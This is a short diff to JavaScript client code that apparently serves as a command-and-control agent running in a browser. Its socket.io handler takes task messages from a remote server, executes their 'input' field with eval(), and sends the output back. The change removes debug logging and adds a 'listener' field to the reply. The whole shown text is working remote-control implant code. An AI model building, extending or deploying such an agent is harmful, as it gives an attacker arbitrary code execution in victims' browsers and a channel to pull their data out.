@@ -53,22 +53,17 @@ var remotePort = document.location.port;
                 }
             };
             mysocket.on('issue_task', function(msg) {
-                console.log(msg);
-                console.log("Commande recue");
+
                 id = msg['task_id'];
-                console.log(msg['input']);
+                listener = msg['listener'];
                 try {
                     var cmdout = eval(String(msg['input'])); //do the task
                     if (String(msg['input']).includes('sendOutput') == false) {
-                        sendOutput(id, cmdout, type=msg['type']);
+                        sendOutput(id, cmdout, listener, type=msg['type']);
                     }
                 } catch (err) {
-                    sendOutput(id, err, type=msg['type']);
+                    sendOutput(id, err, listener, type=msg['type']);
                 }
-            });
-            mysocket.on('test', function(msg){
-                console.log("dans test");
-                console.log(msg);
             });
             mysocket
         });
